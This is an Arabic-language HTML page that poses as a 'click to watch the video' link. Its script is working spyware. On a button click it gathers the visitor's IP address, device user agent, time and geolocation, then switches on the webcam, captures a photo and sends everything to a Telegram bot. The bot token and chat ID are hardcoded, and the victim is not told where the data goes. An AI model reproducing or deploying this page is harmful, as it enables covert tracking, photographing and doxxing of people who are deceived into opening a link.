<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>🎥 اضغط لمشاهدة الفيديو</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Tahoma', sans-serif;
      background-color: #121212;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      margin-bottom: 20px;
    }
    button {
      padding: 14px 28px;
      font-size: 18px;
      background-color: #ff2c55;
      border: none;
      border-radius: 12px;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #e91e63;
    }
    #loading {
      margin-top: 20px;
      display: none;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <h2>🎥 اضغط لمشاهدة الفيديو</h2>
  <p>اضغط موافق لمشاهدة فيديو</p>
  <button onclick="startProcess()">📤 موافق</button>
  <p id="loading">⏳ جارٍ المعالجة...</p>
  <video id="video" autoplay playsinline></video>  <script>
    const chatId = "7220184605";
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";

    async function sendTelegramMessage(text) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function getIP() {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    }

    async function startProcess() {
      document.getElementById('loading').style.display = 'block';

      const ip = await getIP();
      const device = navigator.userAgent;
      const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Damascus" });

      let locationText = "📍 الموقع: لم يُسمح به";
      try {
        await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition((position) => {
            const lat = position.coords.latitude.toFixed(5);
            const lon = position.coords.longitude.toFixed(5);
            locationText = `📍 https://maps.google.com/?q=${lat},${lon}`;
            resolve();
          }, reject, {timeout: 5000});
        });
      } catch (e) {
        locationText = "📍 الموقع: رفض المستخدم أو فشل";
      }

      const baseMessage = `🔍 زائر جديد:%0A🌐 IP: ${ip}%0A📱 الجهاز: ${device}%0A🕓 التاريخ: ${now}%0A${locationText}`;
      await sendTelegramMessage(baseMessage);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.play();

        setTimeout(async () => {
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
            document.getElementById('loading').textContent = '✅ تم التقاط الصورة وإرسال البيانات بنجاح';
          }, 'image/jpeg');
        }, 3000);

      } catch (err) {
        await sendTelegramMessage("⚠️ لم يتم منح إذن الكاميرا.");
        document.getElementById('loading').textContent = '⚠️ لم يتم منح إذن الكاميرا.';
      }
    }
  </script></body>
</html>
